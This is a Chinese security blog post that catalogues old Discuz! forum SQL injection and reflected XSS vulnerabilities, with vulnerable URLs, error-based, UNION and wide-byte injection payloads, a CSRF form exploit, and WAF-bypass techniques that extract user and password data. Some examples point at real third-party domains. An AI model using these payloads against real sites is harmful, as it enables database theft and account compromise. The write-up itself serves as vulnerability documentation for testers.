<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
       
      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
       
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>wLHK-Discuz漏洞整理 |  小透的少年江湖</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/haoyun.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
      <canvas width="1777" height="841"
        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-wLHK-Discuz漏洞整理"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  wLHK-Discuz漏洞整理
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" class="article-date">
  <time datetime="2021-10-26T01:56:28.000Z" itemprop="datePublished">2021-10-26</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/CMS%E6%BC%8F%E6%B4%9E/">CMS漏洞</a> / <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/CMS%E6%BC%8F%E6%B4%9E/Discuz/">Discuz</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">6.7k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">30 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Discuz-X漏洞"><a href="#Discuz-X漏洞" class="headerlink" title="Discuz!X漏洞"></a>Discuz!X漏洞</h1><h2 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h2><p><strong>漏洞描述：</strong>Discuz历史版本中存在着大量的sql注入漏洞，存在于大量插件和管理后台中，且有些SQL注入漏洞涉及版本不清晰。涉及URL如下：</p>
<p>##问卷调查专业版插件-nds_ques_viewanswer.inc.php—&gt;演示1</p>
<p><a target="_blank" rel="noopener" href="http://ip/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dataline">http://ip/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dataline</a></p>
<p>##/source/include/misc/misc_stat.php—&gt;演示2</p>
<p><a target="_blank" rel="noopener" href="http://ip/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types%5B1%5D=x">http://ip/bbs/misc.php?mod=stat&amp;op=trend&amp;xml=1&amp;merge=1&amp;types[1]=x</a></p>
<p>##discuz ychat插件-table_ychat_rooms.php、rooms.php—&gt;演示3</p>
<p><a target="_blank" rel="noopener" href="http://ip/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x">http://ip/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x</a></p>
<p>##江湖客栈插件-forummission.php—&gt;演示4</p>
<p><a target="_blank" rel="noopener" href="http://ip/forummission.php?index=show&amp;id=24">http://ip/forummission.php?index=show&amp;id=24</a></p>
<p>## my.php—&gt;演示5</p>
<p><a target="_blank" rel="noopener" href="http://ip/my.php?item=buddylist">http://ip/my.php?item=buddylist</a></p>
<p>## UChome插件—&gt;演示6</p>
<p><a target="_blank" rel="noopener" href="http://ip/uchome/cp.php?ac=blog&amp;blogid=1">http://ip/uchome/cp.php?ac=blog&amp;blogid=1</a></p>
<p>##交友插件- jiaoyou.php—&gt;演示7</p>
<p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?pid=1">http://ip/jiaoyou.php?pid=1</a></p>
<p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?mod=search&amp;residecity">http://ip/jiaoyou.php?mod=search&amp;residecity</a>=</p>
<p>##v63积分商城插件- \source\class\discuz\discuz_database.php—&gt;演示8</p>
<p><a target="_blank" rel="noopener" href="http://ip/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110">http://ip/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110</a></p>
<p>## misc插件- source\module\forum\forum_misc.php—&gt;演示9</p>
<p><a target="_blank" rel="noopener" href="http://ip/forum.php?mod=misc&tid=%7Btid%7D&action=postappend&pid=%7Bpid%7D">http://ip/forum.php?mod=misc&amp;tid={tid}&amp;action=postappend&amp;pid={pid}</a></p>
<p>## attachment插件- \source\module\forum\forum_attachment.php—&gt;演示10</p>
<p><a target="_blank" rel="noopener" href="http://ip/forum.php?mod=attachment&amp;findpost=ss&amp;aid">http://ip/forum.php?mod=attachment&amp;findpost=ss&amp;aid</a>=</p>
<p>##心情墙插件- moodwall.inc.php—&gt;演示11</p>
<p><a target="_blank" rel="noopener" href="http://ip/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2">Http://ip/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2</a></p>
<p>##空间功能-space.php—&gt;演示12</p>
<p><a target="_blank" rel="noopener" href="http://ip/space.php?username">http://ip/space.php?username</a>=</p>
<p>## trade.php—&gt;演示13</p>
<p><a target="_blank" rel="noopener" href="http://ip/trade.php">http://ip/trade.php</a></p>
<p>##会员中心—&gt;演示14</p>
<p><a target="_blank" rel="noopener" href="http://ip/member/pm.php?dopost=read&amp;id=1">http://ip/member/pm.php?dopost=read&amp;id=1</a></p>
<p>##管理后台-工具-数据电泳-自定义-模块名称等—&gt;演示15</p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有19个功能或插件存在sql注入，但最后4个sql注入漏洞只找到POC，暂时无法演示。</p>
<h3 id="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"><a href="#演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞" class="headerlink" title="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"></a>演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞</h3><p>找到问卷调查专业版插件所在链接：<a target="_blank" rel="noopener" href="http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline">http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline</a>(问题出在orderby参数)，对该参数进行sql注入</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ec93ccdee00378ab38b1316ace94c44b.png" class>

<p>接下来就是使用sqlmap进行暴库了。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.5kik.com/php0day/239.html">http://www.5kik.com/php0day/239.html</a></p>
<h3 id="演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）"><a href="#演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）" class="headerlink" title="演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）"></a>演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）</h3><p>找到注入点：<a target="_blank" rel="noopener" href="http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types%5B1%5D=x">http://localhost/bbs/misc.php?mod=stat&amp;op=trend&amp;xml=1&amp;merge=1&amp;types[1]=x</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946b2c1d8e99431b39ca31aa6d56b11d.png" class>

<p>也就是说我们可以控制的部分有很多。<br>且不看全局防注入源码，黑盒试一下我发现一旦出现’、(就会拦截，而且注释符（#、–）也会拦截。<br>括号不能有，就特别拙计，因为很多盲注需要括号，子查询也需要括号，函数也需要括号，这里都不能用了。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/85936efd8e72984ff6c94729f00cf1a3.png" class>

<p>我们再看上述sql语句，发现我们可控的部分前面，还有个daytime。这就愁坏我了，因为我要查询的表是用户表，而用户表根本没这个字段。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a01c46097785d64627eac5950a435d50.png" class>

<p>执行会提示Unknown column ‘daytime’ in ‘field list’。<br>所以，我们可以利用mysql的特性，一次查询两个表，将pre_ucenter_members的数据连带着查询出来：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b1530110687ade97e4c2ee5244cf1782.png" class>

<p>大家可以看到，已经不报错了。因为pre_common_statuser表中存在`daytime`这个列。而且这个表中也有uid这个列，正好可以作为pre_ucenter_members的筛选项。<br>那么，有的同学再问，sql语句后半部分<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/cbe2ae3ffe3c952fc9bec375b642557b.png" class></p>
<p>没有注释符怎么处理？<br>这里有个巧合，在某些情况下，`能作为注释符用。因为mysql会自动给sql语句结尾没有闭合的`闭合掉，这样，只要让mysql人为后面那一大串字符是一个字段的“别名”即可。<br>所以，先构造一个url：</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3203a48961dfad2e03dbd9c55ee76626.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/50cf97eebf609ecdeda0134d1a96fe3a.png" class>

<p>可以看到已经出数据了。但发现出来的数据只有4位。<br>原因是，在源码中使用了substr取了daytime的第4到8位。修改POC</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/618e4f8322f62c03c515a8d32169f169.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/26869.html">https://www.secpulse.com/archives/26869.html</a></p>
<h3 id="演示3：discuz-ychat插件注入漏洞"><a href="#演示3：discuz-ychat插件注入漏洞" class="headerlink" title="演示3：discuz ychat插件注入漏洞"></a>演示3：discuz ychat插件注入漏洞</h3><p><a target="_blank" rel="noopener" href="http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x">http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x</a></p>
<p>cid参数存在SQL注入</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=108978">https://bugs.shuimugan.com/bug/view?bug_no=108978</a></p>
<h3 id="演示4：Discuz-Plugin-JiangHu-1-1-forummission-php-SQL注入漏洞"><a href="#演示4：Discuz-Plugin-JiangHu-1-1-forummission-php-SQL注入漏洞" class="headerlink" title="演示4：Discuz Plugin JiangHu 1.1 /forummission.php SQL注入漏洞"></a>演示4：Discuz Plugin JiangHu 1.1 /forummission.php SQL注入漏洞</h3><p>forummission.php？index=show$id=24中的id参数存在sql注入漏洞</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8737db6a75addd1839b67cde1f094956.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="http://www.gltc.cn/30161.html">http://www.gltc.cn/30161.html</a></p>
<h3 id="演示5：Discuz-6-0-my-php-SQL注入漏洞"><a href="#演示5：Discuz-6-0-my-php-SQL注入漏洞" class="headerlink" title="演示5：Discuz 6.0 /my.php SQL注入漏洞"></a>演示5：Discuz 6.0 /my.php SQL注入漏洞</h3><p>把以下EXP保存成HTML文档</p>
<p>&lt;form method=’post’ action=’<a target="_blank" rel="noopener" href="http://dz6.0/my.php?item=buddylist&#39;\&gt;">http://dz6.0/my.php?item=buddylist&#39;\&gt;</a> &lt;input<br>type=’hidden’ value=”1111” name=”descriptionnew[1’ and(select 1 from(select<br>count(*),concat((select (select (select<br>concat(0x7e,user(),0x7e,0x5430304C5320474F21,0x7e) limit 0,1)) from<br>information_schema.tables limit 0,1),floor(rand(0)*2))x from<br>information_schema.tables group by x)a) and 1=1#]” /&gt;&lt;br /&gt; &lt;input<br>type=’submit’ value=’buddysubmit’ name=’buddysubmit’ /&gt;&lt;br /&gt; &lt;/form&gt;</p>
<p>使用浏览器打开</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ea45b4207fca0e5fb1d8a950810dca79.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=80359">https://bugs.shuimugan.com/bug/view?bug_no=80359</a></p>
<h3 id="演示6：UChome-注入漏洞1"><a href="#演示6：UChome-注入漏洞1" class="headerlink" title="演示6：UChome 注入漏洞1"></a>演示6：UChome 注入漏洞1</h3><p>首先注册用户 然后新建一个相册<br><a target="_blank" rel="noopener" href="http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me">http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me</a> 打开这里点上传<br>新建完了之后 上传一个图片 完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片<br>直接确认 然后抓包 把titie的那个改成 title%5B1’ and (select 1 from (select<br>count(),concat(version(),floor(rand(0)2))x from information_schema.tables group<br>by x)a)#%5D 原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b253b877f2608abb78cf36512ad2179e.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93618">https://www.seebug.org/vuldb/ssvid-93618</a></p>
<h3 id="演示7：UChome-注入漏洞2"><a href="#演示7：UChome-注入漏洞2" class="headerlink" title="演示7：UChome 注入漏洞2"></a>演示7：UChome 注入漏洞2</h3><p>注册用户后登陆 然后点击日志 创建新日志 然后打开BURP进行抓包<br>找一个没有用的POST选项 改成picids[‘] 然后在提交 就可以看到结果了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/295ac8423cf91b32c8f202dcbf79d357.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/199e997d938cc2d2e3f8ffc1d061c07d.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93616">https://www.seebug.org/vuldb/ssvid-93616</a></p>
<h3 id="演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞"><a href="#演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞" class="headerlink" title="演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞"></a>演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞</h3><p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?pid=1">http://ip/jiaoyou.php?pid=1</a></p>
<p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?mod=search&amp;residecity">http://ip/jiaoyou.php?mod=search&amp;residecity</a>=</p>
<p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?mod=search&amp;resideprovince">http://ip/jiaoyou.php?mod=search&amp;resideprovince</a>=</p>
<p>pid、residecity、resideprovince参数均存在SQL注入</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/dd22c1792c7d1a99a4a3b8589a9d8286.png" class>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.unhonker.com/bug/1058.html">https://www.unhonker.com/bug/1058.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93641">https://www.seebug.org/vuldb/ssvid-93641</a></p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93641">https://www.seebug.org/vuldb/ssvid-93641</a></p>
<h3 id="演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞"><a href="#演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞" class="headerlink" title="演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞"></a>演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞</h3><p>在discuz<br>v63积分商城插件注入漏洞exp中并不需要斜杠、#号和—注释符。所以会执行$clean =<br>preg_replace(“/’(.+?)’/s”, ”,<br>$sql);原来SQL语句中两个单引号中间的内容就会被替换为空。并不会进入到下面的else分支。Else下面的所有操作均是对$clean变量的操作。所以绕过的思路就是把SQL语句放在两个单引号中间。对于mysql的一个特性，<br>@`’`<br>是为空的，所以我们的攻击语句可以放到两个@`’`中间，即使GPC开启，单引号被转义为\’，而@`’`变成@`\’`对注入也是没有影响的，所以此绕过方法无限制。</p>
<p>即针对该注入漏洞的攻击EXP为：</p>
<p><a target="_blank" rel="noopener" href="http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110">http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110</a> or<br>@`’` and (select * from (select count(*),concat(floor(rand(0)*2),(select<br>user()))a from information_schema.tables group by a)b) or @`’` or @`’` and<br>(select * from (select count(*),concat(floor(rand(0)*2),(select user()))a<br>from information_schema.tables group by a)b) or @`’`</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/df2d41ccd913943f04b53d832c737ae0.png" class>

<p>可以看到我们的注入语句被替换掉了，所以后面的检查字符的时候并没有发现注入语句。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://netsecurity.51cto.com/art/201303/386717.htm">http://netsecurity.51cto.com/art/201303/386717.htm</a></p>
<h3 id="演示10：Discuz-x1-5-x2-0-二次注射"><a href="#演示10：Discuz-x1-5-x2-0-二次注射" class="headerlink" title="演示10：Discuz x1.5 x2.0 二次注射"></a>演示10：Discuz x1.5 x2.0 二次注射</h3><p>访问<a target="_blank" rel="noopener" href="http://xxxxx/forum.php?mod=misc&amp;tid=%7B1%7D&amp;action=postappend&amp;pid=%7B2%7D%E8%BF%9B%E5%85%A5%E5%9B%9E%E5%A4%8D%E4%B8%BB%E9%A2%98%E7%95%8C%E9%9D%A2%E3%80%82%E5%9C%A8%E5%8F%91%E8%A1%A8%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%9C%B0%E6%96%B9%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E3%80%82%E5%A6%82%E8%BE%93%E5%85%A5%E2%80%9Ca&#39;,\%60subject\%60=">http://xxxxx/forum.php?mod=misc&amp;tid={1}&amp;action=postappend&amp;pid={2}进入回复主题界面。在发表回复的地方存在SQL注入。如输入“a&#39;,\`subject\`=</a>(/*!select*/<br>group_concat(uid,’:’) from pre_common_member where groupid=1),comment=’”。</p>
<p>刷新页面，可在主题回复中看到管理用户。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.webshell.cc/562.html">https://www.webshell.cc/562.html</a></p>
<h3 id="演示11：Discuz-X2-forum-attachment-php-sql注入漏洞"><a href="#演示11：Discuz-X2-forum-attachment-php-sql注入漏洞" class="headerlink" title="演示11：Discuz! X2 forum_attachment.php sql注入漏洞"></a>演示11：Discuz! X2 forum_attachment.php sql注入漏洞</h3><p><a target="_blank" rel="noopener" href="http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid">http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid</a>=</p>
<p>链接中，aid参数存在SQL注入，但需要把SQL语句进行base64编码，如</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b018839dadf33e4620e75cef37ac7a90.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/devi1o/articles/4874822.html">https://www.cnblogs.com/devi1o/articles/4874822.html</a></p>
<h3 id="演示12：Discuz！7-2-X1-第三方插件SQL注入及持久型XSS漏洞"><a href="#演示12：Discuz！7-2-X1-第三方插件SQL注入及持久型XSS漏洞" class="headerlink" title="演示12：Discuz！7.2/X1 第三方插件SQL注入及持久型XSS漏洞"></a>演示12：Discuz！7.2/X1 第三方插件SQL注入及持久型XSS漏洞</h3><p><a target="_blank" rel="noopener" href="http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2">http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2</a></p>
<p>moodid存在SQL注入。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93710">https://www.seebug.org/vuldb/ssvid-93710</a></p>
<h3 id="演示13：Discuz-论坛wap功能模块编码的注射漏洞"><a href="#演示13：Discuz-论坛wap功能模块编码的注射漏洞" class="headerlink" title="演示13：Discuz!论坛wap功能模块编码的注射漏洞"></a>演示13：Discuz!论坛wap功能模块编码的注射漏洞</h3><p><a target="_blank" rel="noopener" href="http://xxxxxxx/space.php?username">http://xxxxxxx/space.php?username</a>=</p>
<p>username存在SQL注入，但可能此处会把’过滤成\’，如果是GBK编码的话，可使用宽字节注入的思路绕过。如设置payload为：/space.php?username=%cf’%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,password,50,51,52,53,54,55,56,57,database(),59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84%20from%20cdb_members%20where%20uid=1/*</p>
<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="http://www.vfocus.net/art/20080819/3755.html">http://www.vfocus.net/art/20080819/3755.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/hack/12858.html">https://www.jb51.net/hack/12858.html</a></p>
<h3 id="演示14：Discuz-pm-php注入"><a href="#演示14：Discuz-pm-php注入" class="headerlink" title="演示14：Discuz! pm.php注入"></a>演示14：Discuz! pm.php注入</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1">http://127.0.0.1/dede/member/pm.php?dopost=read&amp;id=1</a></p>
<p>id参数存在SQL注入。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="http://www.hack6.com/wzle/gf/20140208/39554.html">http://www.hack6.com/wzle/gf/20140208/39554.html</a></p>
<h3 id="演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在管理后台-工具-数据-调用-自定义模块存在SQL注入，详情看图即可明白</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/88a65fe6d045049abf00a12f417fc72f.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4b91c80f9526cd448e60a904e4e32d41.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b5a668d79a3a0b596c54ea1009cb4479.png" class>

<p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
<h3 id="漏洞POC："><a href="#漏洞POC：" class="headerlink" title="漏洞POC："></a>漏洞POC：</h3><p>Discuz! 4.x SQL injection POC</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/2859/">https://www.exploit-db.com/exploits/2859/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-5482">https://www.seebug.org/vuldb/ssvid-5482</a></p>
<p>Discuz! 5.0.0 RC1 SQL injection PoC</p>
<p><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_56fb0f050100055g.html">http://blog.sina.com.cn/s/blog_56fb0f050100055g.html</a></p>
<p>Discuz! 5.0.0 GBK SQL Injection / Admin Credentials Disclosure Exploit</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-16732">https://www.seebug.org/vuldb/ssvid-16732</a></p>
<p>Discuz! 5 SQL injection Exploit</p>
<p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-5263">https://www.seebug.org/vuldb/ssvid-5263</a></p>
<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p><strong>漏洞描述：跨站脚本攻击漏洞，恶意攻击者往web页面插入恶意脚本代码，而程序对于用户输入内容未过滤，当用户浏览该页之时，嵌入其中web里面的脚本代码会被执行，从而达到恶意攻击用户的特殊目的。窃取cookie、放蠕虫、网站钓鱼……</strong>。涉及URL如下：</p>
<p>##/include/global.func.php—&gt;演示1</p>
<p><a target="_blank" rel="noopener" href="http://ip/admincp.php?infloat=yes&amp;handlekey=123">http://ip/admincp.php?infloat=yes&amp;handlekey=123</a></p>
<p><a target="_blank" rel="noopener" href="http://ip/logging.php?infloat=yes&amp;handlekey=123">http://ip/logging.php?infloat=yes&amp;handlekey=123</a></p>
<p><a target="_blank" rel="noopener" href="http://ip/api/uchome.php?infloat=yes&amp;handlekey=123">http://ip/api/uchome.php?infloat=yes&amp;handlekey=123</a></p>
<p>##logging.php—&gt;演示2</p>
<p><a target="_blank" rel="noopener" href="http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer">http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer</a>=</p>
<p>##source/function/function_core.php—&gt;演示3</p>
<p><a target="_blank" rel="noopener" href="http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/">http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/</a></p>
<p><a target="_blank" rel="noopener" href="http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/">http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/</a></p>
<p>测试步骤与截图：</p>
<p>各漏洞演示如下，共有3个功能或插件存在反射型XSS</p>
